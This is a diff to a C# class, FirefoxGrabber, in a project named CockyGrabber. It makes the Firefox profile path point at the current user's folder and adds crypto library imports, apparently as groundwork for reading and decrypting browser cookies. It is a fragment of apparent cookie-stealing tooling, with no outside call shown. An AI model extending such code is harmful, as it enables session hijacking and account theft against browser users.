@@ -1,13 +1,20 @@
-﻿using System;
+using Newtonsoft.Json.Linq;
+using Org.BouncyCastle.Crypto;
+using Org.BouncyCastle.Crypto.Engines;
+using Org.BouncyCastle.Crypto.Modes;
+using Org.BouncyCastle.Crypto.Parameters;
+using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Security.Cryptography;
+using System.Text;
 using Cookie = CockyGrabber.Classes.Cookie;
 
 namespace CockyGrabber
 {
     public class FirefoxGrabber
     {
-        public const string FirefoxProfilesPath = @"C:\Users\User\AppData\Roaming\Mozilla\Firefox\Profiles";
+        public string FirefoxProfilesPath = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Mozilla\Firefox\Profiles";
         public string FirefoxCookiePath { get; private set; } // can't make this constant because firefox profiles are made of random chars
 
         public FirefoxGrabber()
@@ -87,5 +94,10 @@ namespace CockyGrabber
             }
             return cookies;
         }
+
+
+
+
+
     }
 }
